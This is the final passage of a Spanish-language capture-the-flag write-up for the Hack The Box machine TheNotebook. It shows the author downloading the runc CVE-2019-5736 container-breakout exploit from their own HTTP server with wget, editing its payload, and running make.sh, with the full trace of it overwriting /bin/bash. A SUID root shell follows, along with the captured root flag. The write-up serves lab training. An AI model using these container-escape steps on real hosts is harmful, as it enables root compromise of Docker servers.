------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
runc &lt; 1.0-rc6 (Docker &lt; 18.09.2) - Container Breakout (1)                                                                                                                                                                                 | linux/local/46359.md
runc &lt; 1.0-rc6 (Docker &lt; 18.09.2) - Container Breakout (2)                                                                                                                                                                                 | linux/local/46369.md
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
</pre></table></code></div></div><p>Abro el segundo documento y observo que se trata de una PoC en la que se detallan los pasos a seguir para explotar la vulnerabilidad y conseguir ejecutar comandos en la máquina anfitrión, lanzando un exploit desde el contenedor de Docker, siempre y cuando <code class="language-plaintext highlighter-rouge">gcc</code> se encuentre instalado en el contenedor.</p><p><img data-proofer-ignore data-src="/assets/img/HTB/TheNotebook/46369.png" alt="Pasos para explotar la vulnerabilidad CVE-2019-5736" /></p><p>En el fichero también se nos indica el <a href="https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/46369.zip">link</a> donde descargar el exploit que se utiliza en la PoC. En el comprimido descargado vienen varios archivos. Para especificar el comando que se quiere ejecutar, es necesario modificar la variable “BAD_BINARY” en el fichero <code class="language-plaintext highlighter-rouge">bad_init.sh</code>.</p><p><img data-proofer-ignore data-src="/assets/img/HTB/TheNotebook/modifiedpayload.png" alt="Modificación de la variable &quot;BAD_BINARY&quot; en el fichero &quot;bad_init.sh&quot;" /></p><p>Una vez definido el comando a ejecutar, levanto un servidor HTTP en mi máquina, descargo la carpeta desde el contenedor y doy permisos de ejecución a los ficheros <code class="language-plaintext highlighter-rouge">bad_init.sh</code> y <code class="language-plaintext highlighter-rouge">make.sh</code>.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>root@f1b5fbc04d80:/tmp# wget -r http://10.10.14.221/CVE-2019-5736 &amp;&amp; cd CVE-2019-5736/ &amp;&amp; chmod +x make.sh bad_init.sh
</pre></table></code></div></div><p>Con esto, solo queda ejecutar el archivo <code class="language-plaintext highlighter-rouge">make.sh</code>, salir del contenedor e intentar volver a acceder.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre>root@0f4c2517af40:/tmp/CVE-2019-5736# ./make.sh 

+++ dirname ./make.sh
++ readlink -f .
+ cd /tmp/CVE-2019-5736
++ find /lib /lib64 /usr/lib
++ sort -r
++ egrep 'libseccomp\.so'
++ head -n1
+ SECCOMP_TARGET=/usr/lib/x86_64-linux-gnu/libseccomp.so.2.3.3
+ cp ./bad_libseccomp.c ./bad_libseccomp_gen.c
+ awk '($4 == ".text" &amp;&amp; $6 == "Base") { print "void", $7 "() {}" }'
+ objdump -T /usr/lib/x86_64-linux-gnu/libseccomp.so.2.3.3
+ cp ./bad_init.sh /bad_init
+ gcc -Wall -Werror -fPIC -shared -rdynamic -o /usr/lib/x86_64-linux-gnu/libseccomp.so.2.3.3 ./bad_libseccomp_gen.c
+ mv /bin/bash /bin/good_bash
+ cat
+ chmod +x /bin/bash

root@0f4c2517af40:/tmp/CVE-2019-5736# exit

exit

noah@thenotebook:~$ sudo docker exec -it webapp-dev01 bash

OCI runtime state failed: unexpected end of JSON input: unknown
</pre></table></code></div></div><p>Este error indica que el exploit ha funcionado y que se debería haber ejecutado el payload definido correctamente.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>noah@thenotebook:~$ ls -la /bin/bash

-rwsr-xr-x 1 root root 1113504 Jun  6  2019 /bin/bash
</pre></table></code></div></div><p>Tras comprobar que dispongo de privilegio SUID en el binario de la “bash”, lanzo un <code class="language-plaintext highlighter-rouge">bash -p</code>, obteniendo privilegios de usuario root y pudiendo así visualizar la flag final.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>noah@thenotebook:~$ bash -p
bash-4.4# id

uid=1000(noah) gid=1000(noah) euid=0(root) groups=1000(noah)

bash-4.4# cat /root/root.txt

377fb1deff3f09bab1a5ee8b3e86a187
</pre></table></code></div></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>HackTheBox</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/linux/" class="post-tag no-text-decoration" >linux</a> <a href="/tags/json/" class="post-tag no-text-decoration" >json</a> <a href="/tags/jwt/" class="post-tag no-text-decoration" >jwt</a> <a href="/tags/cookie-hijacking/" class="post-tag no-text-decoration" >cookie_hijacking</a> <a href="/tags/sudo/" class="post-tag no-text-decoration" >sudo</a> <a href="/tags/docker/" class="post-tag no-text-decoration" >docker</a> <a href="/tags/cve/" class="post-tag no-text-decoration" >cve</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Compartir</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=TheNotebook (Hack The Box) - J0lm3d0&url=https://j0lm3d0.github.io/posts/thenotebook-(hack-the-box)/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=TheNotebook (Hack The Box) - J0lm3d0&u=https://j0lm3d0.github.io/posts/thenotebook-(hack-the-box)/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=TheNotebook (Hack The Box) - J0lm3d0&url=https://j0lm3d0.github.io/posts/thenotebook-(hack-the-box)/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink('', '¡Enlace copiado correctamente!')" data-toggle="tooltip" data-placement="top" title="Copiar enlace"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Actualizado recientemente</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/tier-0-starting-point-machines-(hack-the-box)/">Tier 0 Starting Point Machines (Hack The Box)</a><li><a href="/posts/previse-(hack-the-box)/">Previse (Hack The Box)</a><li><a href="/posts/couch-(try-hack-me)/">Couch (Try Hack Me)</a><li><a href="/posts/knife-(hack-the-box)/">Knife (Hack The Box)</a><li><a href="/posts/pentesting_shells_cheat_sheet_script/">Pentesting_Shells-Cheat_Sheet-Script</a></ul></div><div id="access-tags"> <span>Etiquetas en tendencia</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/sudo/">sudo</a> <a class="post-tag" href="/tags/cve/">cve</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/adb/">adb</a> <a class="post-tag" href="/tags/alwaysinstallelevated-privilege/">alwaysinstallelevated_privilege</a> <a class="post-tag" href="/tags/android/">android</a> <a class="post-tag" href="/tags/android-debugger-bridge/">android_debugger_bridge</a> <a class="post-tag" href="/tags/capabilities/">capabilities</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contenidos</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Más entradas</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/knife-(hack-the-box)/"><div class="card-body"> <span class="timeago small" >28 Aug 2021<i class="unloaded">2021-08-28T21:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Knife (Hack The Box)</h3><div class="text-muted small"><p> En este documento se recogen los pasos a seguir para la resolución de la máquina Knife de la plataforma HackTheBox. Se trata de una máquina Linux de 64 bits, que posee una dificultad fácil de resol...</p></div></div></a></div><div class="card"> <a href="/posts/couch-(try-hack-me)/"><div class="card-body"> <span class="timeago small" >12 Nov 2021<i class="unloaded">2021-11-12T11:00:00+01:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Couch (Try Hack Me)</h3><div class="text-muted small"><p> En este documento se recogen los pasos a seguir para la resolución de la máquina Couch de la plataforma TryHackMe. Se trata de una máquina Linux de 64 bits, que posee una dificultad fácil de resolu...</p></div></div></a></div><div class="card"> <a href="/posts/bountyhunter-(hack-the-box)/"><div class="card-body"> <span class="timeago small" >20 Nov 2021<i class="unloaded">2021-11-20T20:00:00+01:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>BountyHunter (Hack The Box)</h3><div class="text-muted small"><p> En este documento se recogen los pasos a seguir para la resolución de la máquina BountyHunter de la plataforma HackTheBox. Se trata de una máquina Linux de 64 bits, que posee una dificultad fácil d...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/armageddon-(hack-the-box)/" class="btn btn-outline-primary" prompt="Anterior"><p>Armageddon (Hack The Box)</p></a> <a href="/posts/love-(hack-the-box)/" class="btn btn-outline-primary" prompt="Siguiente"><p>Love (Hack The Box)</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/J0lm3d0">J0lm3d0</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Etiquetas en tendencia</h4><a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/sudo/">sudo</a> <a class="post-tag" href="/tags/cve/">cve</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/adb/">adb</a> <a class="post-tag" href="/tags/alwaysinstallelevated-privilege/">alwaysinstallelevated_privilege</a> <a class="post-tag" href="/tags/android/">android</a> <a class="post-tag" href="/tags/android-debugger-bridge/">android_debugger_bridge</a> <a class="post-tag" href="/tags/capabilities/">capabilities</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://j0lm3d0.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No se han encontrado resultados.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script>
